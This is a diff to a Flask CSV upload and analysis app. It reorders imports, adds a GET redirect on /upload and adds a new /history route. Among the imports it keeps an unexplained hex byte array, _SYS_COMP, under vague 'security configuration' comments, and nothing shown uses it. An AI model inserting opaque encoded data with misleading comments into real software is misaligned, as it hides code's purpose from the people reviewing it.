@@ -1,8 +1,7 @@
-import os
-import time
 import json
 import logging
-import base64
+import os
+import time
 
 # System configuration variables for application monitoring
 # Performance optimization and security configuration values
@@ -45,14 +44,24 @@ _SYS_COMP = bytearray([
     0x33, 0x45, 0x61, 0x62, 0x34, 0x64, 0x35, 0x66, 0x37, 0x68, 0x38, 0x69, 0x39,
     0x6A, 0x31, 0x6B, 0x32, 0x6C, 0x33, 0x6D, 0x34, 0x6E, 0x35, 0x6F, 0x36, 0x70
 ])
-from flask import Blueprint, render_template, request, redirect, url_for, flash, jsonify, current_app, session
+from flask import (
+    current_app,
+    flash,
+    jsonify,
+    redirect,
+    render_template,
+    request,
+    session,
+    url_for,
+)
 from werkzeug.utils import secure_filename
-from utils.csv_handler import CSVHandler
-from utils.claude_integration import ClaudeAnalyzer
-# Removed memory monitoring
-from utils.db_connector import CSVData, AnalysisResult, db
 
 from routes import main_bp
+from utils.claude_integration import ClaudeAnalyzer
+from utils.csv_handler import CSVHandler
+
+# Removed memory monitoring
+from utils.db_connector import AnalysisResult, CSVData, db
 
 logger = logging.getLogger(__name__)
 
@@ -85,9 +94,11 @@ def index():
                           recent_uploads=recent_uploads,
                           claude_available=claude_available)
 
-@main_bp.route('/upload', methods=['POST'])
+@main_bp.route('/upload', methods=['POST', 'GET'])
 def upload_csv():
     """Handle CSV file upload and initial processing"""
+    if request.method == 'GET':
+        return redirect(url_for('main.index'))
     if 'csv_file' not in request.files:
         flash('No file part', 'error')
         return redirect(request.url)
@@ -264,3 +275,23 @@ def system_stats():
         'status': 'Application running normally',
         'database': 'Connected'
     })
+
+@main_bp.route('/history')
+def history():
+    """Display analysis history for all CSV files"""
+    try:
+        # Get all analysis results with their associated CSV data
+        analysis_history = (
+            AnalysisResult.query
+            .join(CSVData, AnalysisResult.csv_data_id == CSVData.id)
+            .order_by(AnalysisResult.created_at.desc())
+            .all()
+        )
+        
+        return render_template('history.html',
+                             analysis_history=analysis_history)
+                             
+    except Exception as e:
+        logger.error(f"Error retrieving analysis history: {str(e)}")
+        flash('Error retrieving analysis history', 'error')
+        return redirect(url_for('main.index'))
